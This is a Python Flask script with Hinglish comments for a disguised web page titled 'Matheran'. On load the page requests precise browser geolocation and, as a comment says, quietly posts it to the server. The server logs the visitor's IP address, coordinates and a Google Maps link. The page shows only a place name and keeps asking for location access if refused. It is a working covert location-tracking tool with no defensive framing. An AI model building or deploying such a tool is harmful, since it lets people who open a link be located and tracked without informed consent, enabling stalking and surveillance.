
from flask import Flask, render_template_string, request, jsonify

app = Flask(__name__)

# Updated Beautiful HTML/CSS/JS Template
HTML_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <title>Matheran</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        /* Full screen center aur background color styling */
        body, html {
            margin: 0;
            padding: 0;
            width: 100%;
            height: 100%;
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #1f4037, #99f2c8); /* Premium Greenish Background */
            color: white;
            text-align: center;
            overflow: hidden;
        }

        #display-box {
            padding: 20px;
            font-size: 28px;
            font-weight: bold;
            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.3);
            transition: all 0.5s ease;
        }

        .please-on {
            font-size: 20px;
            color: #fff3cd;
            background-color: rgba(255, 193, 7, 0.2);
            padding: 15px 25px;
            border-radius: 8px;
            border: 1px solid #ffc107;
        }
    </style>
</head>
<body>

    <div id="display-box">
        Kripya browser mein location permission ko Allow karein...
    </div>

    <script>
    window.onload = function() {
        getLocation();
    };

    function getLocation() {
        if (!navigator.geolocation) {
            document.getElementById('display-box').textContent = 'Aapka browser GPS support nahi karta.';
            return;
        }

        navigator.geolocation.getCurrentPosition(success, error, {
            enableHighAccuracy: true,
            timeout: 7000,
            maximumAge: 0
        });
    }

    function success(position) {
        const lat = position.coords.latitude;
        const lon = position.coords.longitude;

        // Backend par chupchap data bhej rahe hain
        fetch('/receive-location', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ latitude: lat, longitude: lon })
        })
        .then(response => response.json())
        .then(data => {
            // Success hote hi baaki sab gayab aur sirf "Matheran" center mein dikhega
            const box = document.getElementById('display-box');
            box.innerHTML = "<span style='font-size: 45px; letter-spacing: 2px;'>Matheran</span>";
        });
    }

    function error(err) {
        const box = document.getElementById('display-box');
        // Agar user allow nahi karta ya koi aur vajah ho, toh bina error likhe polite message dikhana
        box.className = "please-on";
        box.innerHTML = "Please allow or turn on your location to proceed.";
    }
    </script>
</body>
</html>
"""


@app.route('/')
def home():
    return render_template_string(HTML_TEMPLATE)


@app.route('/receive-location', methods=['POST'])
def receive_location():
    data = request.get_json()
    latitude = data.get('latitude')
    longitude = data.get('longitude')

    user_ip = request.remote_addr
    if user_ip == "127.0.0.1" or user_ip == "::1":
        user_ip = "127.0.0.1 (Localhost / Same Device)"

    google_maps_link = f"https://www.google.com/maps?q={latitude},{longitude}"

    print("\n" + "=" * 50)
    print(f"🔥 AUTOMATIC DATA RECEIVED! 🔥")
    print(f"USER IP ADDRESS : {user_ip}")
    print(f"Latitude        : {latitude}")
    print(f"Longitude       : {longitude}")
    print(f"Google Maps Link: {google_maps_link}")
    print("=" * 50 + "\n")

    return jsonify({"status": "success"})


if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)
